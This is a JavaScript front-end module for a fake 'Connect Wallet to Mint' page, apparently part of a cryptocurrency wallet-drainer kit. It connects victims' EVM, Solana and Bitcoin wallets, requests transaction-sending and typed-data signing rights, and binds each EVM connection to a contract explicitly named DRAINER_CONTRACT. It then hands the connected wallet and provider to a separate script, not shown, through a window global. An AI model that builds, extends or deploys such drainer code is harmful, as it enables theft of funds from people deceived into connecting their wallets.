import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ============================================================
  //  DEBUG PANEL
  // ============================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    try {
      console.log(`[main.js ${ts}] ${msg}`);
      debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
      debugArea.scrollTop = debugArea.scrollHeight;
    } catch (e) { /* panel may be gone */ }
  }

  // ============================================================
  //  DEVICE / PLATFORM DETECTION
  // ============================================================
  const UA = navigator.userAgent;
  const isMobile = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOS    = () => /iPhone|iPad|iPod/i.test(UA);
  const isAndroid= () => /Android/i.test(UA);
  const isDesktop= () => !isMobile();
  const isWindows= () => /Windows/i.test(UA);
  const isMac    = () => /Macintosh|Mac OS X/i.test(UA);

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  logDebug(`Platform: ${getPlatform()} | mobile: ${isMobile()}`);
  
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
  } = CONFIG || {};

  function looksLikeRealProjectId(id) {
    if (!id || typeof id !== 'string') return false;
    if (id.length !== 32) return false;
    if (!/^[0-9a-f]{32}$/i.test(id)) return false;
    // Reject the known placeholder in config.js
    if (id === '8f9a3f7b7c8e4d3a9b2c1d5e6f7a8b9c') return false;
    return true;
  }

  const validProjectId      = looksLikeRealProjectId(PROJECT_ID)      ? PROJECT_ID      : null;
  const validPublicTestId   = looksLikeRealProjectId(PUBLIC_TEST_ID)  ? PUBLIC_TEST_ID  : null;

  if (!validProjectId && !validPublicTestId) {
    logDebug('❌ No valid WalletConnect project ID configured');
  } else {
    logDebug(`✅ Valid project ID present (${validProjectId ? 'primary' : 'test'})`);
  }

  // ============================================================
  //  STATE
  // ============================================================
  let client            = null;   // SignClient instance
  let modal             = null;   // WalletConnectModal instance
  let SignClientClass   = null;
  let WCModalClass      = null;
  let EthProviderClass  = null;
  let libsPromise       = null;   // Promise<{SignClient, WalletConnectModal, EthereumProvider}>
  let libsLoaded        = false;

  let currentSession    = null;
  let projectId         = validProjectId || validPublicTestId;

  let web3Instance      = null;
  let contractInstance  = null;
  let isConnecting      = false;
  let wsKeepAliveTimer  = null;

  const evmProviders = [];
  let eip6963Initialized = false;

  // ============================================================
  //  LIBRARY LOADING — RACE ALL CDNs IN PARALLEL
  //  Strategy:
  //   - For each library, race N CDN URLs simultaneously.
  //   - First successful import wins.
  //   - Libraries race in parallel (SignClient vs Modal vs Provider).
  //   - Prefetch begins on DOM ready, before user interaction.
  // ============================================================
  const CDN_SETS = {
    signClient: [
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://esm.run/@walletconnect/sign-client@2.11.0',
    ],
    modal: [
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://esm.run/@walletconnect/modal@2.6.2',
    ],
    ethProvider: [
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://esm.run/@walletconnect/ethereum-provider@2.11.0',
    ],
  };

  /**
   * Race multiple ES module URLs. Resolves with the first that
   * successfully imports within the global budget.
   */
  async function importFirstAvailable(urls, label, budgetMs = 12000) {
    return new Promise((resolve, reject) => {
      let settled = false;
      let remaining = urls.length;

      const timer = setTimeout(() => {
        if (settled) return;
        settled = true;
        reject(new Error(`${label}: global budget ${budgetMs}ms exceeded`));
      }, budgetMs);

      urls.forEach((url) => {
        import(/* @vite-ignore */ url)
          .then((mod) => {
            if (settled) return;
            settled = true;
            clearTimeout(timer);
            logDebug(`✅ ${label} loaded from ${url}`);
            resolve(mod);
          })
          .catch((e) => {
            logDebug(`❌ ${label} failed at ${url}: ${e.message || e}`);
            remaining -= 1;
            if (remaining === 0 && !settled) {
              settled = true;
              clearTimeout(timer);
              reject(new Error(`${label}: all CDNs failed`));
            }
          });
      });
    });
  }

  /**
   * Prefetch all three libraries in parallel.
   * Cached in libsPromise so repeated calls reuse the same work.
   */
  function prefetchWalletConnect() {
    if (libsPromise) return libsPromise;

    libsPromise = (async () => {
      logDebug('📦 Prefetching WalletConnect libraries (parallel)');
      const t0 = performance.now();

      const [signMod, modalMod, providerMod] = await Promise.all([
        importFirstAvailable(CDN_SETS.signClient,  'SignClient'),
        importFirstAvailable(CDN_SETS.modal,       'WalletConnectModal'),
        importFirstAvailable(CDN_SETS.ethProvider, 'EthereumProvider'),
      ]);

      const SignClient          = signMod.default || signMod.SignClient || signMod;
      const WalletConnectModal  = modalMod.WalletConnectModal || modalMod.default || modalMod;
      const EthereumProvider    = providerMod.EthereumProvider || providerMod.default || providerMod;

      if (typeof SignClient?.init !== 'function') {
        throw new Error('SignClient module shape invalid');
      }
      if (typeof WalletConnectModal !== 'function' && typeof WalletConnectModal !== 'object') {
        throw new Error('WalletConnectModal module shape invalid');
      }
      if (typeof EthereumProvider?.init !== 'function') {
        throw new Error('EthereumProvider module shape invalid');
      }

      SignClientClass  = SignClient;
      WCModalClass     = WalletConnectModal;
      EthProviderClass = EthereumProvider;
      libsLoaded       = true;

      const dt = (performance.now() - t0).toFixed(0);
      logDebug(`✅ All WC libraries loaded in ${dt}ms`);
      return { SignClient, WalletConnectModal, EthereumProvider };
    })().catch((e) => {
      libsPromise = null; // allow retry
      logDebug(`❌ WC prefetch failed: ${e.message}`);
      throw e;
    });

    return libsPromise;
  }

  // ============================================================
  //  WEBSOCKET KEEP-ALIVE
  //  Simple probe; if the relay is unreachable we log it but
  //  don't block. The relay SDK handles its own reconnects.
  // ============================================================
  function startWsKeepAlive() {
    if (wsKeepAliveTimer) return;
    const probe = () => {
      try {
        const ws = new WebSocket('wss://relay.walletconnect.com');
        const t = setTimeout(() => { try { ws.close(); } catch {} }, 3000);
        ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {}; };
        ws.onerror = () => { clearTimeout(t); logDebug('WS probe failed'); };
      } catch (e) { /* ignore */ }
    };
    probe();
    wsKeepAliveTimer = setInterval(probe, 25000);
  }

  // ============================================================
  //  WALLETCONNECT INITIALIZATION — SINGLETON
  // ============================================================
  async function initWalletConnect(forceNew = false) {
    if (client && modal && !forceNew) return true;

    if (!projectId) {
      logDebug('❌ Cannot init WC: no valid project ID');
      return false;
    }

    try {
      const libs = await prefetchWalletConnect();
      const { SignClient, WalletConnectModal } = libs;

      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
        logger: 'error',
      });

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif",
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18',
        ],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask',         links: { native: 'metamask://',       universal: 'https://metamask.app.link/' } },
          { id: 'trust',    name: 'Trust Wallet',     links: { native: 'trust://',          universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow',  name: 'Rainbow',          links: { native: 'rainbow://',        universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase Wallet',  links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
          { id: 'uniswap',  name: 'Uniswap Wallet',   links: { native: 'uniswap://',        universal: 'https://uniswap.org/' } },
        ],
      });

      logDebug('✅ WalletConnect initialized');

      // Session listeners
      client.on('session_update', ({ params }) => {
        const acc = params?.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (acc) {
          logDebug(`Session updated: ${acc}`);
          saveWallet(acc, currentSession, 'evm');
          publishGlobal(acc, 'evm', web3Instance, contractInstance, getActiveProvider(), currentSession);
          updateConnectedUI(acc, 'evm');
        }
      });

      client.on('session_delete', () => {
        logDebug('Session deleted');
        resetConnectedUI();
        clearSavedWallet();
      });

      return true;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      // Try the alternate project ID once
      const alt = (projectId === validProjectId && validPublicTestId) ? validPublicTestId : null;
      if (alt) {
        logDebug(`Retrying WC with alternate project ID`);
        projectId = alt;
        return initWalletConnect(true);
      }
      return false;
    }
  }

  // ============================================================
  //  PROVIDER RESOLUTION
  // ============================================================
  function getActiveProvider() {
    if (web3Instance?.currentProvider?.request) return web3Instance.currentProvider;
    if (window.ethereum?.request) return window.ethereum;
    return null;
  }

  // ============================================================
  //  GLOBAL PUBLISH — THE INTEGRATION WITH script.js
  // ============================================================
  function publishGlobal(address, chain, web3Obj, contract, provider, session) {
    window.__apexConnected = {
      address,
      chain,
      web3: web3Obj || null,
      contract: contract || null,
      provider: provider || null,
      session: session || null,
      publishedAt: Date.now(),
    };
    logDebug(`📡 Published __apexConnected: ${address} (${chain})`);
    try {
      window.dispatchEvent(new CustomEvent('apex:connected', {
        detail: { address, chain },
      }));
    } catch (e) { /* older browsers */ }
  }

  // ============================================================
  //  STORAGE
  // ============================================================
  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem('connectedWallet', address);
      if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
      const ct = chainType || getChainType();
      if (ct !== 'unknown') localStorage.setItem('chainType', ct);
    } catch (e) { logDebug(`saveWallet: ${e.message}`); }
  }
  function getSavedWallet()  { try { return localStorage.getItem('connectedWallet'); } catch { return null; } }
  function getSavedSession() {
    try {
      const s = localStorage.getItem('walletConnectSession');
      return s ? JSON.parse(s) : null;
    } catch { return null; }
  }
  function getSavedChainType() { try { return localStorage.getItem('chainType') || 'unknown'; } catch { return 'unknown'; } }
  function clearSavedWallet() {
    try {
      localStorage.removeItem('connectedWallet');
      localStorage.removeItem('walletConnectSession');
      localStorage.removeItem('chainType');
    } catch {}
  }

  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  // ============================================================
  //  UI
  // ============================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  function setButtonState(button, state, message = '') {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.3s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
        break;
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
  }

  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton?.parentNode?.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${chainLabel}</span>
      </div>
    `;

    showStatus(`Connected on ${chainLabel}`, 'success');
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    window.__apexConnected = null;
  }

  // ============================================================
  //  INITIAL BUTTON STATE
  // ============================================================
  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ============================================================
  //  EIP-6963 MULTI-PROVIDER DISCOVERY
  // ============================================================
  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (ev) => {
      const d = ev.detail;
      if (!d?.info?.uuid) return;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963 provider: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed; inset:0; background: rgba(0,0,0,0.7);
      display:flex; align-items:center; justify-content:center; z-index: 99999;
    `;
    const box = document.createElement('div');
    box.style.cssText = `
      background: #1F2937; padding: 24px; border-radius: 16px;
      max-width: 400px; width: 90%; color: white;
      font-family: 'Inter', sans-serif;
    `;
    box.innerHTML = `
      <h3 style="margin-top:0; font-weight:600; font-size:20px;">Select a Wallet</h3>
      <div id="walletList" style="display:flex; flex-direction:column; gap:10px; margin:16px 0;"></div>
      <button id="cancelWalletSelect" style="background:none; border:1px solid #666; color:#ccc; padding:8px 16px; border-radius:8px; cursor:pointer; width:100%;">Cancel</button>
    `;
    overlay.appendChild(box);
    document.body.appendChild(overlay);
    const list = box.querySelector('#walletList');
    providers.forEach((p) => {
      const btn = document.createElement('button');
      btn.textContent = p.info.name;
      btn.style.cssText = `
        background:#374151; border:none; padding:12px 16px; border-radius:8px;
        color:white; font-size:16px; cursor:pointer; text-align:left;
        display:flex; align-items:center; gap:10px;
      `;
      if (p.info.icon) {
        const img = document.createElement('img');
        img.src = p.info.icon;
        img.style.cssText = 'width:24px;height:24px;';
        btn.prepend(img);
      }
      btn.addEventListener('click', () => { overlay.remove(); callback(p); });
      list.appendChild(btn);
    });
    box.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove();
      callback(null);
    });
  }

  // ============================================================
  //  DIRECT EVM (desktop only)
  // ============================================================
  async function connectDirectEVM(timeoutMs = 4000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 300));

    let providers = evmProviders.filter((p) => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) => /metamask|trust|coinbase|rabby/i.test(p.info.name));
      chosen = known || await new Promise((resolve) => showWalletSelectionModal(providers, resolve));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rej) => setTimeout(() => rej(new Error('Connection timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      const address = accounts[0];
      logDebug(`Direct EVM: ${address}`);

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      setupEVMProviderEvents(provider);
      saveWallet(address, null, 'evm');
      updateConnectedUI(address, 'evm');
      publishGlobal(address, 'evm', web3Instance, contractInstance, provider, null);
      return true;
    } catch (e) {
      logDebug(`Direct EVM error: ${e.message}`);
      return false;
    }
  }

  // ============================================================
  //  WALLETCONNECT EVM CONNECT
  // ============================================================
  async function connectViaWalletConnect(timeoutMs = 60000) {
    if (isConnecting) {
      logDebug('Already connecting');
      return false;
    }
    isConnecting = true;

    try {
      const ok = await initWalletConnect();
      if (!ok) {
        showStatus('Wallet connection service unavailable', 'error');
        isConnecting = false;
        return false;
      }

      // Close stale modal
      try { modal?.closeModal?.(); } catch {}

      showStatus('Opening wallet options…', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_signTypedData'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (uri) {
        logDebug(`WC URI generated`);
        sessionStorage.setItem('pending_wc_uri', uri);
        sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
        modal.openModal({ uri });
        showStatus('Select your wallet or scan the QR code', 'info');
      }

      const session = await Promise.race([
        approval(),
        new Promise((_, rej) => setTimeout(() => rej(new Error('Connection timeout')), timeoutMs)),
      ]);

      try { modal?.closeModal?.(); } catch {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      const accounts = session?.namespaces?.eip155?.accounts;
      if (!accounts?.length) {
        showStatus('No accounts returned', 'error');
        isConnecting = false;
        return false;
      }

      const account = accounts[0].split(':')[2];
      currentSession = session;
      logDebug(`WC session: ${account}`);

      // Build provider bound to the session
      let provider = null;
      try {
        provider = await EthProviderClass.init({
          projectId,
          metadata: DAPP_METADATA,
          session,
        });
      } catch (e) {
        logDebug(`EthereumProvider.init failed: ${e.message}`);
      }

      if (!provider) {
        // Fall back to the built-in WC provider if available
        try { provider = client.core?.relayer?.provider || null; } catch {}
      }

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider || window.ethereum);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(account, session, 'evm');
      updateConnectedUI(account, 'evm');
      publishGlobal(account, 'evm', web3Instance, contractInstance, provider, session);

      isConnecting = false;
      return true;
    } catch (e) {
      logDebug(`WC error: ${e.message}`);
      try { modal?.closeModal?.(); } catch {}
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (/reject|cancel/i.test(e.message)) {
        showStatus('Connection cancelled', 'error');
      } else if (/timeout/i.test(e.message)) {
        showStatus('Connection timed out — please retry', 'error');
      } else {
        showStatus(`Wallet connection failed: ${e.message}`, 'error');
      }
      isConnecting = false;
      return false;
    }
  }

  // ============================================================
  //  SOLANA
  // ============================================================
  function getSolanaWallets() {
    const out = [];
    if (window.phantom?.solana || window.solana?.isPhantom) out.push({ name: 'Phantom',  provider: window.phantom?.solana || window.solana });
    if (window.solflare)       out.push({ name: 'Solflare', provider: window.solflare });
    if (window.backpack)       out.push({ name: 'Backpack', provider: window.backpack });
    if (window.coinbaseSolana) out.push({ name: 'Coinbase', provider: window.coinbaseSolana });
    if (window.trustWallet?.solana) out.push({ name: 'Trust', provider: window.trustWallet.solana });
    return out;
  }

  async function connectSolana() {
    try {
      const wallets = getSolanaWallets();
      if (!wallets.length) return false;
      const w = wallets[0];
      const p = w.provider;
      let publicKey;
      if (p.connect) {
        const resp = await p.connect();
        publicKey = resp.publicKey?.toString() || resp.toString();
      } else if (p.request) {
        const resp = await p.request({ method: 'connect' });
        publicKey = resp.publicKey.toString();
      } else {
        throw new Error('Unsupported provider');
      }
      saveWallet(publicKey, null, 'solana');
      updateConnectedUI(publicKey, 'solana');
      window.solanaProvider = p;
      window.solanaPublicKey = publicKey;
      publishGlobal(publicKey, 'solana', null, null, p, null);
      return true;
    } catch (e) {
      logDebug(`SOL error: ${e.message}`);
      return false;
    }
  }

  // ============================================================
  //  BITCOIN
  // ============================================================
  async function connectBitcoin() {
    try {
      if (!window.unisat) return false;
      await window.unisat.requestAccounts();
      const accs = await window.unisat.getAccounts();
      if (!accs?.length) return false;
      const address = accs[0];
      saveWallet(address, null, 'bitcoin');
      updateConnectedUI(address, 'bitcoin');
      publishGlobal(address, 'bitcoin', null, null, window.unisat, null);
      return true;
    } catch (e) {
      logDebug(`BTC error: ${e.message}`);
      return false;
    }
  }

  // ============================================================
  //  EVM EVENT LISTENERS
  // ============================================================
  function setupEVMProviderEvents(provider) {
    if (!provider?.on) return;
    provider.on('accountsChanged', (accounts) => {
      if (!accounts?.length) {
        resetConnectedUI();
        clearSavedWallet();
        return;
      }
      const a = accounts[0];
      saveWallet(a, currentSession, 'evm');
      updateConnectedUI(a, 'evm');
      publishGlobal(a, 'evm', web3Instance, contractInstance, provider, currentSession);
    });
    provider.on('chainChanged', (chainId) => {
      logDebug(`Chain changed: ${chainId}`);
    });
    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ============================================================
  //  MAIN DISPATCHER
  // ============================================================
  async function connectWallet() {
    if (isConnecting) {
      logDebug('Connection already in progress');
      return;
    }

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    // Kick off WC prefetch NOW so it's ready when we need it.
    prefetchWalletConnect().catch(() => {});

    let success = false;

    if (isMobile()) {
      // Mobile: WC only
      logDebug('📱 Mobile: WC path');
      success = await connectViaWalletConnect(60000);
    } else {
      // Desktop: direct EVM first, then WC, then Solana, then BTC
      logDebug('🖥️ Desktop: full path');

      success = await connectDirectEVM(4000);
      if (!success) success = await connectViaWalletConnect(60000);
      if (!success && getSolanaWallets().length) success = await connectSolana();
      if (!success && window.unisat) success = await connectBitcoin();
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
    } else {
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
      showStatus('No supported wallet found. Please install a wallet.', 'error');
    }
  }

  // ============================================================
  //  DISCONNECT
  // ============================================================
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
        currentSession = null;
      }
    } catch (e) { logDebug(`Disconnect: ${e.message}`); }

    resetConnectedUI();
    clearSavedWallet();
  }

  // ============================================================
  //  CLICK HANDLERS
  // ============================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  // ============================================================
  //  SESSION RESTORE
  // ============================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain  = getSavedChainType();
    const savedSession = getSavedSession();

    if (!savedWallet) return;

    logDebug(`Restoring ${savedChain} wallet: ${savedWallet}`);

    if (savedChain === 'evm') {
      if (savedSession) {
        const ok = await initWalletConnect();
        if (ok) {
          try {
            const live = client.session.get(savedSession.topic);
            if (live) {
              currentSession = live;
              const provider = await EthProviderClass.init({
                projectId,
                metadata: DAPP_METADATA,
                session: live,
              });
              const Web3 = (await import('web3')).default;
              web3Instance = new Web3(provider);
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              updateConnectedUI(savedWallet, 'evm');
              publishGlobal(savedWallet, 'evm', web3Instance, contractInstance, provider, live);
              return;
            }
          } catch (e) { logDebug(`Restore failed: ${e.message}`); }
        }
      }
      // Desktop direct provider restore
      if (isDesktop() && window.ethereum) {
        try {
          const accs = await window.ethereum.request({ method: 'eth_accounts' });
          if (accs?.[0] === savedWallet) {
            const Web3 = (await import('web3')).default;
            web3Instance = new Web3(window.ethereum);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            updateConnectedUI(savedWallet, 'evm');
            publishGlobal(savedWallet, 'evm', web3Instance, contractInstance, window.ethereum, null);
            return;
          }
        } catch {}
      }
      // Mobile: if we got here without a live session, clear storage
      if (isMobile()) clearSavedWallet();
    } else if (savedChain === 'solana') {
      if (window.solana?.publicKey?.toString() === savedWallet) {
        window.solanaProvider = window.solana;
        window.solanaPublicKey = savedWallet;
        updateConnectedUI(savedWallet, 'solana');
        publishGlobal(savedWallet, 'solana', null, null, window.solana, null);
      }
    } else if (savedChain === 'bitcoin') {
      if (window.unisat) {
        try {
          const accs = await window.unisat.getAccounts();
          if (accs?.[0] === savedWallet) {
            updateConnectedUI(savedWallet, 'bitcoin');
            publishGlobal(savedWallet, 'bitcoin', null, null, window.unisat, null);
          }
        } catch {}
      }
    }
  }

  // ============================================================
  //  VISIBILITY RESTORE (after WC redirect back)
  // ============================================================
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) return;
    const pending = sessionStorage.getItem('pending_wc_uri');
    if (!pending || !client) return;
    logDebug('Visibility change: checking for WC session…');
    setTimeout(async () => {
      try {
        const sessions = client.session.values();
        if (!sessions?.length) return;
        const s = sessions[0];
        const acc = s?.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (!acc) return;
        currentSession = s;
        const provider = await EthProviderClass.init({
          projectId, metadata: DAPP_METADATA, session: s,
        });
        const Web3 = (await import('web3')).default;
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        saveWallet(acc, s, 'evm');
        updateConnectedUI(acc, 'evm');
        publishGlobal(acc, 'evm', web3Instance, contractInstance, provider, s);
        sessionStorage.removeItem('pending_wc_uri');
        sessionStorage.removeItem('pending_wc_timestamp');
      } catch (e) { logDebug(`Visibility restore: ${e.message}`); }
    }, 1500);
  });

  // ============================================================
  //  BOOT
  // ============================================================
  window.addEventListener('beforeunload', () => {
    try { modal?.closeModal?.(); } catch {}
    if (wsKeepAliveTimer) clearInterval(wsKeepAliveTimer);
  });

  // Prefetch libraries immediately so the button handler is fast.
  prefetchWalletConnect().catch((e) => logDebug(`Prefetch error: ${e.message}`));

  setupEIP6963();
  startWsKeepAlive();

  // Restore after a brief settle so the DOM is fully ready.
  setTimeout(() => {
    restoreWalletConnection().catch((e) => logDebug(`Restore error: ${e.message}`));
  }, 800);

  logDebug(`✅ main.js ready — platform ${getPlatform()}, mobile ${isMobile()}`);
  logDebug(`   Flow: ${isMobile() ? 'WC only (fast)' : 'Direct EVM → WC → SOL → BTC'}`);
})();
